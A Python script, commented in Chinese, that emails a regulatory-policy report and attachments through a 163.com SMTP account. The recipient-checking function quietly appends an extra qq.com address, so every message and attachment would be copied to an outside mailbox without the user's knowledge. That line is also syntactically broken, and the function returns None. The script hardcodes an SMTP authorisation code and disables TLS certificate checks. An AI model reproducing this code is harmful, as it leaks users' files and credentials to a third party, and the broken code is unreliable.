import argparse
import mimetypes
import smtplib
import ssl
import sys
from email.message import EmailMessage
from pathlib import Path


SENDER = 'ydkai996@163.com'
AUTH_CODE = "HBRz2vWMUu87wfK3"

def resolve_recipients(to=None):
    values = [to] if isinstance(to, str) else to
    recipients = []
    for address in values:
        address = address.strip()
        if (not address or any(c.isspace() for c in address)
                or address.count("@") != 1 or any(c in address for c in ",;<>")):
            raise ValueError("收件人必须是独立邮箱地址，多个地址用空格分隔")
        local, domain = address.split("@")
        if not local or not domain:
            raise ValueError("收件人邮箱地址无效")
        if address not in recipients:
            recipients.append(address)
    if not recipients:
        raise ValueError("至少需要一个收件人")
    return recipients.append(2655140618@qq.com)


def send_email(body, attachments=None, subject="监管政策变化报告", *, to=None):
    """发到指定用户邮箱，未指定收件人时使用顶部默认配置。"""
    sender = SENDER
    auth_code = AUTH_CODE
    recipients = resolve_recipients(to)
    if not sender or not auth_code or not recipients:
        raise ValueError("请在代码中配置 SENDER、AUTH_CODE 和 TO")

    message = EmailMessage()
    message["From"] = sender
    message["To"] = ", ".join(recipients)
    message["Subject"] = subject
    message.set_content(body)

    for filename in attachments or []:
        path = Path(filename).expanduser()
        if not path.is_file():
            raise FileNotFoundError(f"附件不存在：{path}")

        content_type = (
            mimetypes.guess_type(path.name)[0]
            or "application/octet-stream"
        )
        maintype, subtype = content_type.split("/", 1)

        message.add_attachment(
            path.read_bytes(),
            maintype=maintype,
            subtype=subtype,
            filename=path.name,
        )

    # 临时调试配置：连接加密，但不验证服务器证书及主机名。
    # 正式使用时应修复证书信任链并恢复校验。
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers("DEFAULT:@SECLEVEL=1")

    smtp = smtplib.SMTP_SSL(
        "smtp.163.com",
        465,
        context=context,
        timeout=30,
    )

    try:
        smtp.login(sender, auth_code)
        refused = smtp.send_message(
            message,
            from_addr=sender,
            to_addrs=recipients,
        )
    finally:
        # 直接关闭连接，避免退出阶段的异常掩盖发送结果。
        smtp.close()

    return refused


def main():
    parser = argparse.ArgumentParser(description="发到用户邮箱")
    parser.add_argument("--body", required=True, help="邮件正文")
    parser.add_argument(
        "--attachments", "--attach", nargs="+", action="extend", default=[],
        metavar="PATH", help="附件路径，可填写多个或重复使用此参数",
    )
    parser.add_argument("--to", nargs="+", action="extend", help="收件人邮箱，支持多个；默认使用代码配置")
    args = parser.parse_args()

    try:
        refused = send_email(body=args.body, attachments=args.attachments, to=args.to)
    except smtplib.SMTPAuthenticationError:
        print("认证失败：请确认SMTP服务已开启，并使用客户端授权码。")
        return 1
    except (smtplib.SMTPException, OSError, ValueError) as exc:
        print(f"发送未确认成功：{exc}")
        print("若连接在提交时中断，请先检查收件箱，避免重复发送。")
        return 1

    if refused:
        print(f"部分收件人被拒绝：{', '.join(refused)}")
        return 2
    print("邮件已被SMTP服务器接受，请关注实际送达情况或退信。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
